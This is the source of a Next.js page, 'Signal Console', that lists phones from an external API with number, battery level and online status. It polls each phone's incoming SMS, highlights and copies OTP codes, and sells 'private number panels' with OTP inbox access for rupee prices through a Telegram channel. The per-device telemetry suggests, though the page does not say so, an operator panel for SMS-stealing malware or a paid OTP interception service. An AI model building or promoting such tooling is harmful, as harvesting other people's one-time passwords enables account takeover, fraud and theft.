// app/page.tsx
'use client'

import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { Toaster, toast } from 'sonner'
import {
  Activity,
  ArrowRight,
  Battery,
  BatteryCharging,
  BatteryLow,
  CheckCircle2,
  CircleAlert,
  Clock3,
  Copy,
  Crown,
  Gem,
  Inbox,
  MessageSquareText,
  MonitorSmartphone,
  Radio,
  RefreshCw,
  Send,
  ShieldCheck,
  Smartphone,
  Sparkles,
  Star,
  Wifi,
  Zap,
} from 'lucide-react'
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog'

// ─── Config ─────────────────────────────────────────────────────────────────
const API_BASE = 'https://apifb-ten.vercel.app'
const TELEGRAM_URL = 'https://t.me/bagga_tools'

// ─── Types ──────────────────────────────────────────────────────────────────
type Device = {
  client_id: string
  mobNo: string
  battery: string | number
  status: boolean
}
type OtpMessage = {
  id: string
  sender: string
  message: string
  dateTime: string
}
type FetchState = 'idle' | 'loading' | 'success' | 'error'

// ─── Pricing plans ──────────────────────────────────────────────────────────
const PANEL_PLANS = [
  {
    id: 'starter',
    name: 'Starter',
    price: 50,
    duration: '29 Days',
    tagline: 'Perfect to test the waters',
    features: ['10+ number', 'OTP inbox access', 'Instant activation', '29D validity'],
    icon: Zap,
    accent: 'from-sky-500/20 to-cyan-400/5',
    ring: 'ring-sky-400/30',
    text: 'text-sky-300',
  },
  {
    id: 'pro',
    name: 'Pro',
    price: 99,
    duration: '29 days',
    tagline: 'Most chosen plan',
    features: ['25+ private numbers', 'OTP inbox + full logs', 'Priority support', '29-day validity'],
    icon: Crown,
    accent: 'from-fuchsia-500/25 to-purple-400/5',
    ring: 'ring-fuchsia-400/40',
    text: 'text-fuchsia-300',
    popular: true,
  },
  {
    id: 'elite',
    name: 'Elite',
    price: 199,
    duration: '30 days',
    tagline: 'For power users',
    features: ['50+ numbers', 'API access included', 'Dedicated support', '30-day validity'],
    icon: Gem,
    accent: 'from-amber-500/20 to-yellow-400/5',
    ring: 'ring-amber-400/30',
    text: 'text-amber-300',
  },
] as const

// ─── Helpers ────────────────────────────────────────────────────────────────
function BatteryGlyph({ level }: { level: number }) {
  if (Number.isNaN(level)) return <Battery className="h-3.5 w-3.5 text-slate-400" />
  if (level > 60) return <BatteryCharging className="h-3.5 w-3.5 text-emerald-400" />
  if (level >= 20) return <Battery className="h-3.5 w-3.5 text-amber-400" />
  return <BatteryLow className="h-3.5 w-3.5 text-rose-400" />
}

function formatTime(value: string) {
  const parsed = new Date(value.replace(' ', 'T'))
  return Number.isNaN(parsed.getTime())
    ? value
    : parsed.toLocaleString([], {
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
      })
}

function extractOtp(value: string) {
  return value.match(/\b\d{4,8}\b/)?.[0]
}

function CopyButton({ text }: { text: string }) {
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text)
      toast.success('OTP copied to clipboard', {
        icon: <CheckCircle2 className="h-4 w-4 text-emerald-400" />,
      })
    } catch {
      toast.error('Copy failed — long-press to copy manually')
    }
  }

  return (
    <button
      type="button"
      onClick={handleCopy}
      aria-label="Copy OTP"
      className="inline-flex items-center gap-1.5 rounded-md border border-white/10 bg-white/5 px-2.5 py-1 text-xs text-slate-300 transition hover:border-cyan-400/40 hover:bg-cyan-400/10 hover:text-cyan-200"
    >
      <Copy className="h-3.5 w-3.5" />
      Copy
    </button>
  )
}

// ─── Pricing modal ──────────────────────────────────────────────────────────
function PricingModal({
  open,
  onOpenChange,
}: {
  open: boolean
  onOpenChange: (v: boolean) => void
}) {
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl overflow-hidden border-white/10 bg-[#0a0f1c] p-0 text-slate-100 shadow-2xl">
        <div
          aria-hidden
          className="pointer-events-none absolute inset-0"
          style={{
            background:
              'radial-gradient(600px 300px at 50% -10%, rgba(168,85,247,0.18), transparent 60%),' +
              'radial-gradient(400px 200px at 90% 10%, rgba(34,211,238,0.12), transparent 60%)',
          }}
        />

        <DialogHeader className="relative border-b border-white/5 px-6 pt-6 pb-5 text-left">
          <div className="mb-2 flex items-center gap-2">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-to-br from-fuchsia-400/30 to-cyan-400/20 ring-1 ring-white/10">
              <Crown className="h-4 w-4 text-fuchsia-300" />
            </div>
            <span className="rounded-full border border-fuchsia-400/30 bg-fuchsia-400/10 px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wider text-fuchsia-300">
              Premium
            </span>
          </div>
          <DialogTitle className="text-xl font-semibold">
            Get a Private Number Panel
          </DialogTitle>
          <DialogDescription className="text-sm text-slate-400">
            Buy a dedicated private number panel from the admin — starting at just ₹50.
            Contact us on Telegram to activate your plan.
          </DialogDescription>
        </DialogHeader>

        <div className="relative grid gap-4 p-6 md:grid-cols-3">
          {PANEL_PLANS.map((plan) => {
            const Icon = plan.icon
            const isPopular = 'popular' in plan && plan.popular
            return (
              <div
                key={plan.id}
                className={`relative flex flex-col rounded-2xl border border-white/10 bg-gradient-to-br ${plan.accent} p-5 ring-1 ${plan.ring} transition hover:-translate-y-0.5 hover:shadow-lg`}
              >
                {isPopular && (
                  <span className="absolute -top-2.5 left-1/2 -translate-x-1/2 rounded-full bg-gradient-to-r from-fuchsia-500 to-purple-500 px-3 py-0.5 text-[10px] font-bold uppercase tracking-wider text-white shadow-lg">
                    Most popular
                  </span>
                )}
                <div className="mb-3 flex items-center gap-2">
                  <div
                    className={`flex h-9 w-9 items-center justify-center rounded-lg bg-white/10 ring-1 ring-inset ring-white/10 ${plan.text}`}
                  >
                    <Icon className="h-4 w-4" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold text-slate-100">{plan.name}</p>
                    <p className="text-[11px] text-slate-400">{plan.tagline}</p>
                  </div>
                </div>

                <div className="mb-4 flex items-end gap-1">
                  <span className="text-3xl font-bold tracking-tight text-slate-100">
                    ₹{plan.price}
                  </span>
                  <span className="mb-1 text-xs text-slate-500">/ {plan.duration}</span>
                </div>

                <ul className="mb-5 flex-1 space-y-2 text-xs text-slate-300">
                  {plan.features.map((f) => (
                    <li key={f} className="flex items-start gap-1.5">
                      <CheckCircle2 className={`mt-0.5 h-3.5 w-3.5 shrink-0 ${plan.text}`} />
                      <span>{f}</span>
                    </li>
                  ))}
                </ul>

                <a
                  href={TELEGRAM_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                  className={`inline-flex items-center justify-center gap-1.5 rounded-lg bg-white/10 px-3 py-2 text-xs font-semibold text-slate-100 ring-1 ring-inset ring-white/10 transition hover:bg-white/20 ${plan.text} hover:${plan.text}`}
                >
                  <Send className="h-3.5 w-3.5" />
                  Contact on Telegram
                </a>
              </div>
            )
          })}
        </div>

        <div className="relative flex flex-col items-center justify-between gap-3 border-t border-white/5 bg-white/[0.02] px-6 py-4 text-xs text-slate-400 sm:flex-row">
          <p className="flex items-center gap-1.5">
            <ShieldCheck className="h-3.5 w-3.5 text-emerald-400" />
            Pay securely via UPI · Instant activation
          </p>
          <a
            href={TELEGRAM_URL}
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center gap-1.5 font-medium text-cyan-300 hover:text-cyan-200"
          >
            @bagga_tools
            <ArrowRight className="h-3.5 w-3.5" />
          </a>
        </div>
      </DialogContent>
    </Dialog>
  )
}

// ─── Main page ──────────────────────────────────────────────────────────────
export default function HomePage() {
  const [dbCode, setDbCode] = useState('101')
  const [debouncedCode, setDebouncedCode] = useState(dbCode)
  const [devices, setDevices] = useState<Device[]>([])
  const [selectedId, setSelectedId] = useState('')
  const [messages, setMessages] = useState<OtpMessage[]>([])
  const [deviceState, setDeviceState] = useState<FetchState>('idle')
  const [messageState, setMessageState] = useState<FetchState>('idle')
  const [error, setError] = useState('')
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null)
  const [pricingOpen, setPricingOpen] = useState(false)
  const abortRef = useRef<AbortController | null>(null)

  const selectedDevice = useMemo(
    () => devices.find((d) => d.client_id === selectedId),
    [devices, selectedId],
  )

  useEffect(() => {
    const t = setTimeout(() => setDebouncedCode(dbCode.trim()), 400)
    return () => clearTimeout(t)
  }, [dbCode])

  const fetchDevices = useCallback(
    async (signal?: AbortSignal) => {
      if (!debouncedCode) return
      setDeviceState('loading')
      setError('')
      try {
        const res = await fetch(
          `${API_BASE}/api/${encodeURIComponent(debouncedCode)}/devices`,
          { signal, cache: 'no-store' },
        )
        if (!res.ok) {
          throw new Error(
            res.status === 404
              ? 'Database code not found.'
              : `Unable to load devices (${res.status}).`,
          )
        }
        const payload = await res.json()
        const active: Device[] = Array.isArray(payload.devices)
          ? payload.devices.filter((d: Device) => d.status)
          : []
        setDevices(active)
        setSelectedId((cur) =>
          active.some((d) => d.client_id === cur) ? cur : active[0]?.client_id ?? '',
        )
        setDeviceState('success')
        setLastUpdated(new Date())
      } catch (cause) {
        if ((cause as Error).name === 'AbortError') return
        setDevices([])
        setSelectedId('')
        setMessages([])
        setDeviceState('error')
        setError((cause as Error).message || 'Could not connect to the API.')
      }
    },
    [debouncedCode],
  )

  const fetchMessages = useCallback(
    async (signal?: AbortSignal) => {
      if (!selectedDevice) {
        setMessages([])
        setMessageState('idle')
        return
      }
      setMessageState('loading')
      try {
        const res = await fetch(
          `${API_BASE}/api/${encodeURIComponent(debouncedCode)}/messages/${encodeURIComponent(
            selectedDevice.client_id,
          )}`,
          { signal, cache: 'no-store' },
        )
        if (!res.ok) throw new Error(`Unable to load messages (${res.status}).`)
        const payload = await res.json()
        setMessages(Array.isArray(payload.messages) ? payload.messages : [])
        setMessageState('success')
        setLastUpdated(new Date())
      } catch (cause) {
        if ((cause as Error).name === 'AbortError') return
        setMessages([])
        setMessageState('error')
        setError((cause as Error).message || 'Could not load messages.')
      }
    },
    [debouncedCode, selectedDevice],
  )

  useEffect(() => {
    abortRef.current?.abort()
    const c = new AbortController()
    abortRef.current = c
    fetchDevices(c.signal)
    return () => c.abort()
  }, [fetchDevices])

  useEffect(() => {
    const c = new AbortController()
    fetchMessages(c.signal)
    return () => c.abort()
  }, [fetchMessages])

  useEffect(() => {
    if (!autoRefresh || !selectedDevice) return
    const id = window.setInterval(() => fetchMessages(), 3000)
    return () => window.clearInterval(id)
  }, [autoRefresh, selectedDevice, fetchMessages])

  const busy = deviceState === 'loading' || messageState === 'loading'
  const refreshAll = () => {
    fetchDevices()
    if (selectedDevice) fetchMessages()
  }

  return (
    <div className="relative min-h-screen overflow-hidden bg-[#070b14] text-slate-100">
      {/* Ambient background */}
      <div
        aria-hidden
        className="pointer-events-none absolute inset-0"
        style={{
          background:
            'radial-gradient(1200px 600px at 15% -10%, rgba(56,189,248,0.18), transparent 60%),' +
            'radial-gradient(900px 500px at 100% 10%, rgba(168,85,247,0.15), transparent 55%),' +
            'radial-gradient(700px 400px at 50% 110%, rgba(16,185,129,0.12), transparent 60%)',
        }}
      />
      <div
        aria-hidden
        className="pointer-events-none absolute inset-0 opacity-[0.06]"
        style={{
          backgroundImage:
            'linear-gradient(rgba(255,255,255,0.6) 1px, transparent 1px),' +
            'linear-gradient(90deg, rgba(255,255,255,0.6) 1px, transparent 1px)',
          backgroundSize: '44px 44px',
          maskImage: 'radial-gradient(ellipse at center, black 30%, transparent 75%)',
        }}
      />

      <div className="relative mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8">
        {/* Header */}
        <header className="mb-8 flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
          <div className="flex items-center gap-3">
            <div className="relative flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br from-cyan-400/30 to-fuchsia-500/20 ring-1 ring-white/10 backdrop-blur">
              <Radio className="h-5 w-5 text-cyan-300" />
              <span className="absolute -right-1 -top-1 h-2 w-2 rounded-full bg-emerald-400 shadow-[0_0_12px_2px_rgba(52,211,153,0.7)]" />
            </div>
            <div>
              <h1 className="text-lg font-semibold tracking-tight">Signal Console</h1>
              <a
                href={TELEGRAM_URL}
                target="_blank"
                rel="noopener noreferrer"
                className="group inline-flex items-center gap-1 text-xs text-slate-400 hover:text-cyan-300"
              >
                <Send className="h-3 w-3" />
                Join @bagga_tools
                <ArrowRight className="h-3 w-3 transition group-hover:translate-x-0.5" />
              </a>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <input
              value={dbCode}
              onChange={(e) => setDbCode(e.target.value)}
              placeholder="DB code"
              aria-label="Database code"
              className="h-10 w-28 rounded-lg border border-white/10 bg-white/[0.04] px-3 font-mono text-sm text-slate-100 outline-none backdrop-blur transition placeholder:text-slate-500 focus:border-cyan-400/50 focus:bg-white/[0.06] focus:ring-2 focus:ring-cyan-400/20"
            />

            <button
              type="button"
              onClick={refreshAll}
              disabled={busy}
              className="inline-flex h-10 items-center gap-2 rounded-lg border border-white/10 bg-white/[0.04] px-4 text-sm font-medium text-slate-200 transition hover:border-cyan-400/40 hover:bg-cyan-400/10 hover:text-cyan-200 disabled:opacity-60"
            >
              <RefreshCw className={`h-4 w-4 ${busy ? 'animate-spin' : ''}`} />
              <span className="hidden sm:inline">Refresh</span>
            </button>

            <button
              type="button"
              onClick={() => setPricingOpen(true)}
              className="group relative inline-flex h-10 items-center gap-2 overflow-hidden rounded-lg bg-gradient-to-r from-fuchsia-500 via-purple-500 to-cyan-500 px-4 text-sm font-semibold text-white shadow-[0_0_24px_-6px_rgba(217,70,239,0.6)] transition hover:shadow-[0_0_28px_-4px_rgba(217,70,239,0.8)]"
            >
              <Sparkles className="h-4 w-4" />
              Get Panel
              <span className="rounded-full bg-white/20 px-1.5 py-0.5 text-[10px] font-bold">
                ₹50+
              </span>
            </button>
          </div>
        </header>

        <div className="grid gap-6 lg:grid-cols-[300px_1fr]">
          {/* Sidebar */}
          <aside className="space-y-4">
            <div className="rounded-2xl border border-white/10 bg-white/[0.03] backdrop-blur-xl">
              <div className="flex items-center justify-between border-b border-white/5 px-4 py-3">
                <div className="flex items-center gap-2">
                  <MonitorSmartphone className="h-4 w-4 text-slate-400" />
                  <h2 className="text-sm font-semibold">Devices</h2>
                </div>
                <span className="rounded-full border border-cyan-400/30 bg-cyan-400/10 px-2 py-0.5 text-[10px] font-medium uppercase tracking-wider text-cyan-300">
                  {devices.length} active
                </span>
              </div>

              <div className="max-h-[60vh] overflow-y-auto">
                {deviceState === 'loading' && (
                  <div className="space-y-2 p-3">
                    {[1, 2, 3].map((i) => (
                      <div
                        key={i}
                        className="h-16 animate-pulse rounded-xl bg-white/[0.04]"
                      />
                    ))}
                  </div>
                )}

                {deviceState === 'error' && (
                  <div className="m-3 rounded-xl border border-rose-500/30 bg-rose-500/10 p-3 text-sm text-rose-200">
                    <div className="mb-1 flex items-center gap-1.5 font-medium">
                      <CircleAlert className="h-4 w-4" /> Connection failed
                    </div>
                    <p className="text-xs text-rose-200/80">{error}</p>
                  </div>
                )}

                {deviceState === 'success' && devices.length === 0 && (
                  <div className="p-6 text-center">
                    <Inbox className="mx-auto mb-2 h-8 w-8 text-slate-500" />
                    <p className="text-sm font-medium text-slate-300">No active devices</p>
                    <p className="mt-1 text-xs text-slate-500">Check the DB code above.</p>
                  </div>
                )}

                {deviceState === 'success' && devices.length > 0 && (
                  <ul className="divide-y divide-white/5">
                    {devices.map((device) => {
                      const battery = Number(device.battery)
                      const selected = device.client_id === selectedId
                      return (
                        <li key={device.client_id}>
                          <button
                            type="button"
                            onClick={() => setSelectedId(device.client_id)}
                            aria-pressed={selected}
                            className={`group flex w-full items-center gap-3 px-4 py-3 text-left transition ${
                              selected
                                ? 'bg-gradient-to-r from-cyan-400/15 to-transparent'
                                : 'hover:bg-white/[0.03]'
                            }`}
                          >
                            <div
                              className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-lg ring-1 ring-inset transition ${
                                selected
                                  ? 'bg-cyan-400/20 text-cyan-200 ring-cyan-400/40'
                                  : 'bg-white/5 text-slate-400 ring-white/10 group-hover:text-slate-300'
                              }`}
                            >
                              <Smartphone className="h-4 w-4" />
                            </div>
                            <div className="min-w-0 flex-1">
                              <p className="truncate text-sm font-medium text-slate-100">
                                {device.mobNo}
                              </p>
                              <p className="truncate font-mono text-[11px] text-slate-500">
                                {device.client_id}
                              </p>
                            </div>
                            <div className="flex items-center gap-1 text-xs text-slate-400">
                              <BatteryGlyph level={battery} />
                              <span className="tabular-nums">{battery}%</span>
                            </div>
                          </button>
                        </li>
                      )
                    })}
                  </ul>
                )}
              </div>
            </div>

            <div className="flex items-center justify-between rounded-xl border border-white/5 bg-white/[0.02] px-3 py-2 text-[11px] text-slate-400">
              <span className="flex items-center gap-1.5">
                <Wifi className="h-3 w-3 text-emerald-400" />
                API online
              </span>
              <span className="flex items-center gap-1.5">
                <Activity className="h-3 w-3 text-cyan-400" />
                {autoRefresh ? '3s polling' : 'manual'}
              </span>
            </div>

            {/* Promo card */}
            <button
              type="button"
              onClick={() => setPricingOpen(true)}
              className="group relative block w-full overflow-hidden rounded-xl border border-white/10 bg-gradient-to-br from-fuchsia-500/15 via-purple-500/10 to-cyan-500/10 p-4 text-left transition hover:border-fuchsia-400/30"
            >
              <div className="mb-1 flex items-center gap-2">
                <Star className="h-4 w-4 text-fuchsia-300" />
                <span className="text-sm font-semibold">Private Number Panel</span>
              </div>
              <p className="text-xs text-slate-400">
                Get your own dedicated OTP inbox — from just{' '}
                <span className="font-semibold text-cyan-300">₹50</span>.
              </p>
              <span className="mt-2 inline-flex items-center gap-1 text-xs font-medium text-fuchsia-300">
                View plans
                <ArrowRight className="h-3 w-3 transition group-hover:translate-x-0.5" />
              </span>
            </button>
          </aside>

          {/* Main panel */}
          <section className="space-y-4">
            <div className="relative overflow-hidden rounded-2xl border border-white/10 bg-white/[0.03] backdrop-blur-xl">
              <div className="flex flex-col gap-3 border-b border-white/5 p-5 sm:flex-row sm:items-center sm:justify-between">
                <div>
                  <h2 className="flex items-center gap-2 text-lg font-semibold">
                    {selectedDevice ? (
                      <>
                        <Sparkles className="h-4 w-4 text-cyan-300" />
                        {selectedDevice.mobNo}
                      </>
                    ) : (
                      'Select a device'
                    )}
                  </h2>
                  <p className="mt-0.5 text-xs text-slate-400">
                    {selectedDevice
                      ? `Incoming auth messages for ${selectedDevice.client_id}`
                      : 'Choose an active endpoint from the list.'}
                  </p>
                </div>

                <div className="flex items-center gap-3">
                  {selectedDevice && (
                    <span className="inline-flex items-center gap-1.5 rounded-full border border-emerald-400/30 bg-emerald-400/10 px-2.5 py-1 text-[10px] font-semibold uppercase tracking-wider text-emerald-300">
                      <span className="relative flex h-1.5 w-1.5">
                        <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                        <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-emerald-400" />
                      </span>
                      Live
                    </span>
                  )}
                  <label
                    htmlFor="auto"
                    className="flex cursor-pointer items-center gap-2 text-xs text-slate-400"
                  >
                    <span>Auto</span>
                    <span
                      onClick={() => setAutoRefresh((v) => !v)}
                      className={`relative h-5 w-9 rounded-full transition ${
                        autoRefresh ? 'bg-cyan-500/70' : 'bg-white/10'
                      }`}
                    >
                      <span
                        className={`absolute top-0.5 h-4 w-4 rounded-full bg-white shadow transition ${
                          autoRefresh ? 'left-4' : 'left-0.5'
                        }`}
                      />
                    </span>
                    <input
                      id="auto"
                      type="checkbox"
                      className="sr-only"
                      checked={autoRefresh}
                      onChange={(e) => setAutoRefresh(e.target.checked)}
                    />
                  </label>
                </div>
              </div>

              {selectedDevice && (
                <div className="flex items-center justify-between border-b border-white/5 px-5 py-2 text-[11px] text-slate-500">
                  <span className="flex items-center gap-1.5">
                    <Clock3 className="h-3 w-3" />
                    {lastUpdated
                      ? `Updated ${lastUpdated.toLocaleTimeString()}`
                      : 'Waiting for data'}
                  </span>
                  <span className="tabular-nums">
                    {messages.length} {messages.length === 1 ? 'message' : 'messages'}
                  </span>
                </div>
              )}

              <div className="p-5">
                {messageState === 'loading' && (
                  <div className="space-y-3">
                    {[1, 2, 3].map((i) => (
                      <div
                        key={i}
                        className="h-24 animate-pulse rounded-xl bg-white/[0.04]"
                      />
                    ))}
                  </div>
                )}

                {messageState === 'error' && (
                  <div className="rounded-xl border border-rose-500/30 bg-rose-500/10 p-4 text-sm text-rose-200">
                    <div className="mb-1 flex items-center gap-2 font-medium">
                      <CircleAlert className="h-4 w-4" /> Stream unavailable
                    </div>
                    <p className="text-xs text-rose-200/80">{error}</p>
                    <button
                      type="button"
                      onClick={() => fetchMessages()}
                      className="mt-3 rounded-md border border-rose-400/40 px-3 py-1 text-xs text-rose-100 hover:bg-rose-500/20"
                    >
                      Try again
                    </button>
                  </div>
                )}

                {!selectedDevice && messageState !== 'loading' && (
                  <div className="py-16 text-center">
                    <MonitorSmartphone className="mx-auto mb-3 h-10 w-10 text-slate-600" />
                    <p className="text-sm font-medium text-slate-300">No device selected</p>
                    <p className="mt-1 text-xs text-slate-500">
                      Pick a device on the left to view its OTP stream.
                    </p>
                  </div>
                )}

                {selectedDevice && messageState === 'success' && messages.length === 0 && (
                  <div className="py-16 text-center">
                    <MessageSquareText className="mx-auto mb-3 h-10 w-10 text-slate-600" />
                    <p className="text-sm font-medium text-slate-300">No messages yet</p>
                    <p className="mt-1 text-xs text-slate-500">
                      New OTPs will appear here automatically.
                    </p>
                  </div>
                )}

                {selectedDevice && messageState === 'success' && messages.length > 0 && (
                  <ul className="space-y-3">
                    {messages.map((item) => {
                      const otp = extractOtp(item.message)
                      const cleaned = otp
                        ? item.message.replace(otp, '').replace(/\s+/g, ' ').trim()
                        : item.message
                      return (
                        <li
                          key={item.id}
                          className="group relative overflow-hidden rounded-xl border border-white/10 bg-gradient-to-br from-white/[0.04] to-white/[0.01] p-4 transition hover:border-cyan-400/30"
                        >
                          <div className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-cyan-400/40 to-transparent opacity-0 transition group-hover:opacity-100" />

                          <div className="mb-2 flex items-center justify-between">
                            <div className="flex items-center gap-2">
                              <div className="flex h-7 w-7 items-center justify-center rounded-md bg-cyan-400/10 text-[10px] font-bold uppercase text-cyan-300 ring-1 ring-inset ring-cyan-400/20">
                                {item.sender.slice(0, 2)}
                              </div>
                              <span className="text-sm font-semibold text-slate-100">
                                {item.sender}
                              </span>
                            </div>
                            <span className="rounded-full border border-fuchsia-400/30 bg-fuchsia-400/10 px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wider text-fuchsia-300">
                              OTP
                            </span>
                          </div>

                          {cleaned && (
                            <p className="mb-2 break-words text-sm text-slate-400">{cleaned}</p>
                          )}

                          {otp && (
                            <div className="mb-3 flex items-center gap-3">
                              <code className="rounded-lg border border-cyan-400/30 bg-cyan-400/10 px-3 py-1.5 font-mono text-xl font-bold tracking-[0.2em] text-cyan-200 shadow-[0_0_24px_-6px_rgba(34,211,238,0.6)]">
                                {otp}
                              </code>
                            </div>
                          )}

                          <div className="flex items-center justify-between text-[11px] text-slate-500">
                            <span className="flex items-center gap-1.5">
                              <Clock3 className="h-3 w-3" />
                              {formatTime(item.dateTime)}
                            </span>
                            <CopyButton text={otp ?? item.message} />
                          </div>
                        </li>
                      )
                    })}
                  </ul>
                )}
              </div>
            </div>

            <footer className="flex flex-wrap items-center justify-between gap-2 text-[11px] text-slate-500">
              <span className="flex items-center gap-1.5">
                <Activity className="h-3 w-3 text-cyan-400" />
                {API_BASE.replace('https://', '')}
              </span>
              <a
                href={TELEGRAM_URL}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-1.5 hover:text-cyan-300"
              >
                <Send className="h-3 w-3 text-cyan-400" />
                t.me/bagga_tools
              </a>
              <span className="flex items-center gap-1.5">
                <ShieldCheck className="h-3 w-3 text-emerald-400" />
                Secure channel
              </span>
            </footer>
          </section>
        </div>
      </div>

      {/* Floating Telegram button */}
      <a
        href={TELEGRAM_URL}
        target="_blank"
        rel="noopener noreferrer"
        aria-label="Join our Telegram channel"
        className="group fixed bottom-5 right-5 z-40 flex h-14 w-14 items-center justify-center rounded-full bg-gradient-to-br from-sky-500 to-cyan-400 text-white shadow-[0_8px_30px_-4px_rgba(14,165,233,0.7)] transition hover:scale-105 hover:shadow-[0_8px_36px_-2px_rgba(14,165,233,0.9)]"
      >
        <Send className="h-6 w-6 transition group-hover:-translate-y-0.5 group-hover:translate-x-0.5" />
        <span className="pointer-events-none absolute inset-0 animate-ping rounded-full bg-sky-400/40" />
      </a>

      {/* Pricing modal */}
      <PricingModal open={pricingOpen} onOpenChange={setPricingOpen} />

      {/* Toasts */}
      <Toaster
        theme="dark"
        position="bottom-right"
        toastOptions={{
          style: {
            background: 'rgba(15, 23, 42, 0.95)',
            border: '1px solid rgba(255,255,255,0.1)',
            color: '#f1f5f9',
          },
        }}
      />
    </div>
  )
}
